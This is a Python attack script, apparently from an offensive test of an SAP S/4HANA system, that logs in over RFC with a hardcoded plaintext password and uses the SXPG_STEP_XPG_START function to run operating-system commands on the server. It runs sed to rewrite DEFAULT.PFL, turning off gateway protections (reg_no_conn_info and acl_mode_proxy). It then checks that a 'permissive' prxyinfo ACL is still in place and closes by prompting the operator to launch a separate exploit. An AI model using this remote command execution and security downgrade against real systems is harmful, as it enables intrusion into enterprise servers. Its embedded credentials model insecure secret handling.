#!/usr/bin/env python3
"""Patch DEFAULT.PFL and verify GW is back up after SIGHUP."""
import sys, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
BASE = dict(TARGET='', DESTINATION='', STDINCNTL='R', STDOUTCNTL='M',
            STDERRCNTL='M', TRACECNTL='0', TERMCNTL='C', TRACELEVEL='0',
            LONG_PARAMS='', CONNCNTL='H')

def sxpg(conn, prog, params, label=''):
    if label: print(f"[CMD] {label}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try: r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else: print(f'  ERROR: {e}'); return
    except Exception as e:
        print(f'  ERROR: {e}'); return
    for row in r.get('LOG', []):
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '') if isinstance(row, dict) else str(row)
        if line.rstrip(): print(f'  {line.rstrip()}')

# Wait for GW to restart after SIGHUP
print("[*] Waiting 10s for GW to restart...")
time.sleep(10)

with RFCConnection(sdk_path=SDK, ashost='192.168.2.209', sysnr='00',
                   client='001', user='joris', passwd='SccAdmin123!', lang='EN') as conn:
    print('[+] RFC connected\n')

    # Check current DEFAULT.PFL
    sxpg(conn, '/usr/bin/grep', 'gw/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL',
         'DEFAULT.PFL GW params (before patch)')

    # Patch: reg_no_conn_info 255->1 (user already set to 1 via SMGW, make it permanent)
    # sed with -i flag; note: PARAMS split on spaces so -i and expression are separate tokens
    # sed -i EXPR FILE  (EXPR has no spaces)
    sxpg(conn, '/usr/bin/sed',
         "-i s/gw\\/reg_no_conn_info\\ =\\ 255/gw\\/reg_no_conn_info\\ =\\ 1/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
         'Patch gw/reg_no_conn_info 255->1')

    # Patch: acl_mode_proxy 1->0
    sxpg(conn, '/usr/bin/sed',
         "-i s/gw\\/acl_mode_proxy\\ =\\ 1/gw\\/acl_mode_proxy\\ =\\ 0/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
         'Patch gw/acl_mode_proxy 1->0')

    # Verify patch
    sxpg(conn, '/usr/bin/grep', 'gw/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL',
         'DEFAULT.PFL GW params (after patch)')

    # Verify prxyinfo still in place after restart
    sxpg(conn, '/usr/bin/cat', '/usr/sap/S4H/SYS/global/prxyinfo',
         'prxyinfo (should still be permissive)')

    # Check GW running
    sxpg(conn, '/usr/bin/pgrep', '-a gwrd', 'GW process status')

    # Check gw_log for any recent prxyinfo activity
    sxpg(conn, '/usr/bin/tail', '-10 /usr/sap/S4H/D00/work/gw_log-2026-04-11',
         'GW log (last 10 lines)')

    print('\n[*] Done. Now run the betrusted exploit to test.')
